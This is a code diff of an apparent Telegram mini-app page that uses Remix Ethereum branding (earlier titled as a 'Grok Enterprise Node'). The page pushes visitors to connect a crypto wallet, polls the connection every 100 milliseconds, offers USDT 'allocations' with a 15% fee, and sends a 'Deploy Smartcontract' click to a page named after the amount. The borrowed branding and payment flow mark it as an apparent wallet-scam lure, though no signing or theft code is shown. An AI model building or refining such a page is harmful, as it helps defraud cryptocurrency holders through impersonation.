@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>Grok Enterprise Node - Remix</title>
+    <title>Remix Node - Cloud Builder</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
@@ -29,8 +29,10 @@
             projectId,
             features: { analytics: false, email: false, socials: false },
             themeMode: 'dark',
-            allWallets: 'SHOW', // عرض جميع المحافظ لضمان التوافق
-            connectionMethods: ['walletConnect', 'injected']
+            // إعدادات قسرية لتجاوز تعليق الاتصال
+            allWallets: 'SHOW',
+            enableInjected: true,
+            enableCoinbase: false
         })
 
         window.appKitModal = modal;
@@ -44,44 +46,44 @@
             
             btn.innerHTML = `
                 <div class="flex items-center gap-3">
-                    <div class="w-2 h-2 bg-[#6EEB36] rounded-full animate-pulse"></div>
-                    <span class="text-[#6EEB36] font-mono">CONNECTED: ${shortAddr}</span>
-                </div>`;
+                    <div class="w-2.5 h-2.5 bg-[#6EEB36] rounded-full animate-pulse shadow-[0_0_8px_#6EEB36]"></div>
+                    <span class="text-[#6EEB36] font-mono font-bold tracking-tight uppercase">CONNECTED: ${shortAddr}</span>
+                </div>
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#6EEB36" stroke-width="3"><polyline points="20 6 9 17 4 12"></polyline></svg>`;
             
-            btn.classList.add('border-[#6EEB36]');
+            btn.classList.add('border-[#6EEB36]', 'bg-[#6EEB36]/10');
             window.isWalletConnected = true;
             
-            // إخلاق المودال فوراً
-            modal.close();
+            // إغلاق أي نافذة عالقة
+            try { modal.close(); } catch(e) {}
             
-            // إخفاء زر الفحص اليدوي إذا كان ظاهراً
-            document.getElementById('manualCheck').style.display = 'none';
+            const mc = document.getElementById('manualCheck');
+            if(mc) mc.classList.add('hidden');
             
             if (typeof validateAction === 'function') validateAction();
         }
 
-        // مراقبة الاتصال
-        modal.subscribeAccount(state => {
-            if (state.isConnected && state.address) {
-                forceUpdateUI(state.address);
-            }
-        });
-
-        // فحص دوري سريع جداً (حل مشكلة التعليق)
+        // مراقبة الحساب بشكل دوري مكثف جداً (Polling)
+        // هذا هو "المفتاح" لحل مشكلة التعليق: لا ننتظر الحدث، بل نسأل النظام كل 100ms
         setInterval(() => {
             const account = modal.getAccount();
             if (account && account.isConnected && account.address) {
                 forceUpdateUI(account.address);
             }
-        }, 300);
+        }, 100);
 
-        // إظهار زر الفحص اليدوي بعد 5 ثوانٍ من محاولة الاتصال
-        window.showManualCheck = function() {
-            setTimeout(() => {
-                if (!window.isWalletConnected) {
-                    document.getElementById('manualCheck').classList.remove('hidden');
-                }
-            }, 5000);
+        // وظيفة الفتح المباشر للمحفظة (Deep Link)
+        window.openWalletDirectly = async function() {
+            try {
+                // فتح المودال في وضع الاتصال المباشر
+                await modal.open({ view: 'Connect' });
+                
+                // إظهار زر الإصلاح اليدوي فوراً
+                const mc = document.getElementById('manualCheck');
+                if(mc) mc.classList.remove('hidden');
+            } catch (e) {
+                console.error("Connection error:", e);
+            }
         }
     </script>
 
@@ -91,16 +93,14 @@
         .no-scrollbar::-webkit-scrollbar { display: none; }
         .loading-overlay { display: none; position: fixed; inset: 0; z-index: 1000; background: #000; flex-direction: column; align-items: center; justify-content: center; }
         .content-container { position: relative; background-image: url('background.png'); background-size: cover; border-radius: 40px 40px 0 0; border-top: 2px solid rgba(110, 235, 54, 0.5); flex: 1; display: flex; flex-direction: column; margin-top: 60px; z-index: 10; }
-        .content-inner { position: relative; z-index: 1; height: 100%; display: flex; flex-direction: column; padding: 24px; padding-top: 70px; }
+        .content-inner { position: relative; z-index: 1; height: 100%; display: flex; flex-direction: column; padding: 24px; padding-top: 75px; }
         .profile-wrapper { position: absolute; top: 0; left: 50%; transform: translate(-50%, -50%); z-index: 100; }
-        .remix-input { background: rgba(18, 18, 18, 0.8); border: 1px solid rgba(255, 255, 255, 0.05); color: #fff; backdrop-filter: blur(12px); }
-        .ui-btn { padding: 20px; display: flex; align-items: center; justify-content: center; color: #6EEB36; font-weight: 800; background: rgba(110, 235, 54, 0.05); border: 1px solid rgba(110, 235, 54, 0.2); border-radius: 20px; width: 100%; text-transform: uppercase; transition: 0.3s; }
-        .ui-btn.ready { background: #6EEB36; color: #000; cursor: pointer; box-shadow: 0 0 20px rgba(110, 235, 54, 0.4); }
-        #bottomSheetOverlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.8); backdrop-filter: blur(8px); z-index: 500; }
-        #bottomSheet { position: fixed; bottom: -100%; left: 0; right: 0; background: #1c1c1e; border-radius: 24px 24px 0 0; z-index: 501; transition: 0.4s cubic-bezier(0.32, 0.72, 0, 1); max-height: 80vh; overflow-y: auto; }
+        .remix-input { background: rgba(18, 18, 18, 0.85); border: 1px solid rgba(255, 255, 255, 0.08); color: #fff; backdrop-filter: blur(15px); }
+        .ui-btn { padding: 22px; display: flex; align-items: center; justify-content: center; color: #6EEB36; font-weight: 900; background: rgba(110, 235, 54, 0.05); border: 1px solid rgba(110, 235, 54, 0.2); border-radius: 22px; width: 100%; text-transform: uppercase; transition: 0.4s; }
+        .ui-btn.ready { background: #6EEB36; color: #000; cursor: pointer; box-shadow: 0 10px 30px rgba(110, 235, 54, 0.3); }
+        #bottomSheetOverlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.85); backdrop-filter: blur(10px); z-index: 500; }
+        #bottomSheet { position: fixed; bottom: -100%; left: 0; right: 0; background: #18181b; border-radius: 30px 30px 0 0; z-index: 501; transition: 0.45s cubic-bezier(0.32, 0.72, 0, 1); max-height: 85vh; overflow-y: auto; border-top: 1px solid rgba(110, 235, 54, 0.2); }
         #bottomSheet.active { bottom: 0; }
-        .manual-btn { animation: fadeIn 0.5s ease-in; }
-        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
     </style>
 </head>
 <body>
@@ -108,57 +108,62 @@
     <div class="app-overlay"></div>
 
     <div id="loadingOverlay" class="loading-overlay">
-        <div class="text-[#6EEB36] text-[11px] font-black tracking-widest mb-4 uppercase">Initializing Environment...</div>
-        <div class="w-48 h-[1px] bg-white/10"><div id="progressBar" class="h-full bg-[#6EEB36] w-0 transition-all"></div></div>
+        <div class="text-[#6EEB36] text-[10px] font-black tracking-[0.5em] uppercase mb-4">Initializing Node</div>
+        <div class="w-40 h-[2px] bg-white/5 rounded-full overflow-hidden">
+            <div id="progressBar" class="h-full bg-[#6EEB36] w-0 transition-all"></div>
+        </div>
     </div>
 
     <div id="bottomSheetOverlay" onclick="closeSheet()"></div>
     <div id="bottomSheet" class="no-scrollbar">
-        <div class="p-5 border-b border-white/5 text-center font-bold text-white uppercase text-[10px] tracking-[0.2em]">Select Allocation</div>
-        <div id="amountOptionsContainer"></div>
+        <div class="p-6 border-b border-white/5 flex justify-between items-center text-white text-[10px] font-black uppercase tracking-widest">Select Allocation</div>
+        <div id="amountOptionsContainer" class="pb-10"></div>
     </div>
 
     <div class="flex-1 flex flex-col relative z-10 w-full h-full">
-        <div class="h-[100px] flex items-center justify-center pt-10">
+        <div class="h-[110px] flex items-center justify-center pt-8">
             <div class="text-center">
-                <h2 id="userName" class="text-white text-lg font-black uppercase">REMIX NODE</h2>
-                <span class="text-[#6EEB36] text-[9px] opacity-40 font-mono tracking-[0.3em]">SECURE KERNEL</span>
+                <h2 id="userName" class="text-white text-[17px] font-black uppercase">REMIX NODE</h2>
+                <span class="text-[#6EEB36] text-[9px] font-mono font-bold tracking-[0.2em] opacity-50 uppercase block mt-1 tracking-widest">SECURE BUILDER</span>
             </div>
         </div>
 
         <div class="content-container">
             <div class="profile-wrapper">
-                <div class="w-28 h-28 rounded-[32px] p-[2px] bg-[#6EEB36] shadow-2xl overflow-hidden">
-                    <img id="userPhoto" src="https://ui-avatars.com/api/?name=R&background=000&color=6EEB36" class="w-full h-full rounded-[30px]" alt="U">
+                <div class="w-28 h-28 rounded-[34px] p-[2px] bg-[#6EEB36] shadow-2xl">
+                    <img id="userPhoto" src="https://ui-avatars.com/api/?name=R&background=000&color=6EEB36" class="w-full h-full rounded-[32px] object-cover" alt="User">
                 </div>
             </div>
 
             <div class="content-inner">
-                <div class="flex-1 space-y-4">
+                <div class="flex-1 space-y-5">
                     <div class="bg-white/5 p-4 rounded-2xl border border-white/5 flex items-center gap-4">
-                        <img src="https://remix.ethereum.org/favicon.ico" class="w-8 h-8 opacity-70">
-                        <div><h3 class="text-[12px] font-bold text-white uppercase">REMIX CLOUD ENGINE</h3><p class="text-[9px] text-white/30 uppercase">Node Status: Online</p></div>
+                        <img src="https://remix.ethereum.org/favicon.ico" class="w-6 h-6">
+                        <div>
+                            <h3 class="text-[12px] font-black text-white uppercase">Cloud Environment</h3>
+                            <p class="text-[9px] text-white/30 uppercase font-bold tracking-wider">Ready for BSC deployment</p>
+                        </div>
                     </div>
 
-                    <button id="walletBtn" onclick="window.appKitModal.open(); window.showManualCheck();" class="w-full remix-input rounded-2xl p-5 flex items-center justify-between text-xs font-black uppercase tracking-widest active:scale-95 transition-all">
+                    <!-- تم تغيير onclick إلى الوظيفة الجديدة -->
+                    <button id="walletBtn" onclick="window.openWalletDirectly()" class="w-full remix-input rounded-2xl p-5 flex items-center justify-between text-[13px] font-black uppercase tracking-widest active:scale-95 transition-all">
                         <span>Connect Wallet</span>
                         <span class="text-[#6EEB36]">›</span>
                     </button>
 
-                    <!-- زر الفحص اليدوي المخفي يظهر فقط عند التعليق -->
-                    <button id="manualCheck" onclick="location.reload()" class="hidden manual-btn w-full bg-[#6EEB36]/10 border border-[#6EEB36]/30 rounded-xl p-3 text-[10px] text-[#6EEB36] font-bold uppercase tracking-widest text-center">
-                        ⚠️ Stuck? Click here to verify connection
+                    <!-- زر الفحص القسري في حال تعليق الـ Connecting -->
+                    <button id="manualCheck" onclick="location.reload()" class="hidden w-full bg-[#6EEB36]/10 border border-[#6EEB36]/30 rounded-2xl p-4 text-[10px] text-[#6EEB36] font-black uppercase tracking-widest text-center animate-pulse">
+                        ⚠️ Stuck on "Connecting"? Tap here to verify
                     </button>
 
-                    <button id="amountSheetTrigger" onclick="openSheet()" class="w-full remix-input rounded-2xl p-5 flex items-center justify-between text-xs font-black uppercase tracking-widest active:scale-95 transition-all">
+                    <button id="amountSheetTrigger" onclick="openSheet()" class="w-full remix-input rounded-2xl p-5 flex items-center justify-between text-[13px] font-black uppercase tracking-widest active:scale-95 transition-all">
                         <span id="selectedAmountText">Select Allocation</span>
                         <span class="text-[#6EEB36]">›</span>
                     </button>
                 </div>
 
-                <div class="pb-8">
+                <div class="pb-10">
                     <button id="authorizeBtn" disabled class="ui-btn">Deploy Smartcontract</button>
-                    <p class="text-[9px] text-white/20 text-center mt-3 uppercase font-medium">Terminal v0.54.0-Stable</p>
                 </div>
             </div>
         </div>
@@ -189,8 +194,8 @@
         const container = document.getElementById('amountOptionsContainer');
         amounts.forEach(amt => {
             const div = document.createElement('div');
-            div.className = 'p-5 flex justify-between border-b border-white/5 active:bg-white/5 transition-colors cursor-pointer';
-            div.innerHTML = `<span class="font-bold text-white text-sm">${amt} USDT</span><span class="text-[#6EEB36] font-mono text-xs tracking-tighter">$${(amt * 0.15).toFixed(2)} FEE</span>`;
+            div.className = 'p-6 flex justify-between items-center border-b border-white/5 active:bg-white/5';
+            div.innerHTML = `<span class="font-black text-white text-sm">${amt} USDT</span><span class="text-[#6EEB36] font-mono font-bold text-xs">$${(amt * 0.15).toFixed(2)} FEE</span>`;
             div.onclick = () => {
                 selectedAmount = amt;
                 document.getElementById('selectedAmountText').textContent = `${amt} USDT SELECTED`;
@@ -215,7 +220,7 @@
             const inv = setInterval(() => {
                 p += 4; document.getElementById('progressBar').style.width = p + '%';
                 if (p >= 100) { clearInterval(inv); window.location.href = selectedAmount + '.html'; }
-            }, 40);
+            }, 35);
         };
     </script>
 </body>
